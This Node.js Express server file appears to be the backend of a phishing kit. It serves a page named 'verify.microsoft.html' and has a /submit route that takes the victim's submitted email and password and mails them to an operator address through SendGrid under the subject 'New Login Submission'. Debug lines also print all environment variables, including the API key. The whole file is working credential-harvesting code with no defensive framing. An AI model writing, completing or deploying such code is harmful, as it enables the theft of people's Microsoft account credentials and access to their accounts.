console.log('SENDGRID_API_KEY:', process.env.SENDGRID_API_KEY);
console.log('RECEIVER_EMAIL:', process.env.RECEIVER_EMAIL);
const express = require('express');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const path = require('path');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Debug: print all env vars Railway is passing
console.log('=== Environment Variables ===');
console.log(process.env);

// Only configure SendGrid if API key is present
if (process.env.SENDGRID_API_KEY && process.env.RECEIVER_EMAIL) {
  sgMail.setApiKey(process.env.SENDGRID_API_KEY);
  console.log('✅ SendGrid configured with API key and receiver email.');
} else {
  console.warn('⚠️ Missing SENDGRID_API_KEY or RECEIVER_EMAIL. Emails will not be sent.');
}

// Home route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
});

// Form submission route
app.post('/submit', async (req, res) => {
  const { email, password } = req.body;

  if (!process.env.SENDGRID_API_KEY || !process.env.RECEIVER_EMAIL) {
    console.warn('⚠️ Cannot send email: Missing env vars.');
    return res.status(500).send('Server not configured to send emails.');
  }

  const msg = {
    to: process.env.RECEIVER_EMAIL,
    from: process.env.RECEIVER_EMAIL,
    subject: 'New Login Submission',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  try {
    await sgMail.send(msg);
    res.send('Form submitted successfully!');
  } catch (error) {
    console.error('SendGrid error:', error);
    res.status(500).send('Error sending email.');
  }
});

// Test route to verify SendGrid works
app.get('/test', async (req, res) => {
  if (!process.env.SENDGRID_API_KEY || !process.env.RECEIVER_EMAIL) {
    return res.send('Env vars missing. Cannot send test email.');
  }

  try {
    await sgMail.send({
      to: process.env.RECEIVER_EMAIL,
      from: process.env.RECEIVER_EMAIL,
      subject: 'Test Email',
      text: 'This is a test email from Railway deployment.',
    });
    res.send('✅ Test email sent!');
  } catch (error) {
    console.error('SendGrid test error:', error);
    res.send('❌ Test email failed. Check logs.');
  }
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
